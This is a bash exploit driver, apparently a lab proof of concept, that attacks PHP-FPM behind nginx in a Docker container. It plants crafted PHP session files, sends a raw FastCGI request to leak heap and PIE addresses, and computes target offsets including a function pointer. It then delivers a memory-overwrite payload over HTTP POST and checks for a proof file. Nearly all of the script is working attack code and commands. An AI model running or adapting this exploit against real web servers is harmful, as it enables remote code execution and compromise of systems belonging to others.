#!/usr/bin/env bash
# Phase 1: leak via RAW FastCGI (direct 9003, same worker), WRITE via HTTP->nginx.
# Isolates "does the write deliver through nginx" from the leak transport.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
NAME=${NAME:-p2s-native}
FCGI_PORT=${FCGI_PORT:-9003}
NGINX_URL=${NGINX_URL:-http://127.0.0.1:9005}
NGINX_PORT=${NGINX_PORT:-9002}        # for the priming A GET (via p2s-nginx-8511) -- see note
PROOF=/tmp/fpm5_proof
A=11111111111111111111111111111111
LB=22222222222222222222222222222222
EB=33333333333333333333333333333333

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/native_small
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp /tmp/native_small "$NAME:/tmp/sess_$LB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$LB"
docker exec "$NAME" rm -f "$PROOF"

PRE=${PRE:-24576}
# priming A delivered over HTTP to the SAME nginx-default front end (body-less GET)
A_URL="$NGINX_URL/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"

LEAK_TRIES=${LEAK_TRIES:-6}
HEAP=""; PIE=""
for attempt in $(seq 1 "$LEAK_TRIES"); do
    HEAP=""; PIE=""
    docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
    docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
    curl --max-time 30 -s -o /dev/null -w "[leak] A http=%{http_code}\n" -b "PHPSESSID=$A" "$A_URL"
    python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$LB" feffffffffffffff 0 0 0 4088 12 \
        /var/www/html/echo.php /tmp/native_leak.bin >/dev/null 2>&1 || true
    read -r HEAP PIE < <(python3 - <<'PY'
import struct, sys
try:
    d = open('/tmp/native_leak.bin','rb').read()
except OSError:
    sys.exit(1)
raw=None
for ln in d.split(b'\n'):
    if ln.startswith(b'v5:'):
        try: raw=bytes.fromhex(ln[3:].decode())
        except Exception: sys.exit(1)
        break
if raw is None or len(raw)<0x3010: sys.exit(1)
heap=None
for off in range(0,len(raw)-8,8):
    q=struct.unpack_from('<Q',raw,off)[0]
    if 0x100000000000<q<0x800000000000 and (q&0xfff)==0x428:
        heap=q; break
pie=struct.unpack_from('<Q',raw,0x3008)[0]
if heap is None or pie<=0x100000000000 or (pie&0xfff)!=0x777: sys.exit(1)
print('%#x %#x'%(heap,pie))
PY
) || true
    [ -n "${HEAP:-}" ] && [ -n "${PIE:-}" ] && { echo "[leak] ok attempt $attempt"; break; }
    echo "[leak] attempt $attempt failed" >&2; sleep 0.3
done
[ -z "${HEAP:-}" ] && { echo "[leak] FAILED" >&2; exit 2; }

DRIFT=${DRIFT:-0x37000}
D=$((HEAP + 0x15cbd8 + DRIFT)); BASE=$((PIE - 0x7c9777)); ZIF=$((BASE + 0x60e3a0))
echo "[leak] heap=$HEAP pie=$PIE"; echo "[calc] d=$D base=$BASE zif=$ZIF"

printf 'p1|i:1;p2|i:1;p3|i:1;p4|i:%d;p5|i:%d;p6|i:%d;p7|i:16;p8|i:%s;' \
  $((D + 0x38)) $((D + 0xA00)) $((D + 0xE80)) "$ZIF" > /tmp/native_sess_T
python3 "$HERE/mk_native_fill.py" --d "$D" --heap "$HEAP" --infile "$HERE/payload/fillU.bin" \
  --out /tmp/native_fill.bin --nogdb
docker cp /tmp/native_sess_T "$NAME:/tmp/sess_$EB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$EB"

# exploit pair: priming A (HTTP GET) then WRITE over HTTP POST to nginx
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A"
curl --max-time 30 -s -o /dev/null -w "[exploit] A http=%{http_code}\n" -b "PHPSESSID=$A" "$A_URL"
python3 -I "$HERE/http_deliver.py" "$NGINX_URL" "$EB" feffffffffffffff "${XPAD:-0}" 0 1 0 0 \
    /var/www/html/index.php /tmp/http_b.out 12000 150 8170 /tmp/native_fill.bin
sleep 0.5

if docker cp "$NAME:$PROOF" /tmp/http_proof.out >/dev/null 2>&1; then
    echo "[proof] $PROOF:"; cat /tmp/http_proof.out
else
    echo "[proof] missing; write-over-HTTP did not land" >&2; exit 1
fi
